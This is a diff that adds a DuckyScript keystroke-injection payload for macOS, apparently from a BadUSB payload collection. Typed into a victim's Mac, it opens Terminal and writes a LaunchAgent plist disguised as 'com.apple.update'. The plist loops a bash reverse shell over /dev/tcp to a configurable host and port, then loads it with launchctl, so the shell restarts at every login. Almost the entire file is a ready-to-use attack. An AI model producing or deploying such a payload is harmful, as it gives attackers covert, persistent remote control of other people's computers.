@@ -1,0 +1,37 @@
+REM ============================================================
+REM  macOS · LaunchAgent Persistence
+REM ============================================================
+REM  Creates a LaunchAgent plist that runs a callback script
+REM  on every user login. Standard macOS persistence technique.
+REM
+REM  Set LHOST and LPORT. Clean up:
+REM    rm ~/Library/LaunchAgents/com.apple.update.plist
+
+DEFAULTDELAY 80
+
+DEFINE LHOST 192.168.1.100
+DEFINE LPORT 4444
+
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 400
+ENTER
+DELAY 1500
+STRINGLN mkdir -p ~/Library/LaunchAgents
+STRINGLN cat > ~/Library/LaunchAgents/com.apple.update.plist << 'PEOF'
+STRINGLN <?xml version="1.0" encoding="UTF-8"?>
+STRINGLN <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+STRINGLN <plist version="1.0"><dict>
+STRINGLN <key>Label</key><string>com.apple.update</string>
+STRINGLN <key>ProgramArguments</key><array>
+STRINGLN <string>/bin/bash</string><string>-c</string>
+STRINGLN <string>while true; do bash -i >& /dev/tcp/LHOST/LPORT 0>&1; sleep 300; done</string>
+STRINGLN </array>
+STRINGLN <key>RunAtLoad</key><true/>
+STRINGLN <key>KeepAlive</key><true/>
+STRINGLN </dict></plist>
+STRINGLN PEOF
+DELAY 500
+STRINGLN launchctl load ~/Library/LaunchAgents/com.apple.update.plist
+STRINGLN exit
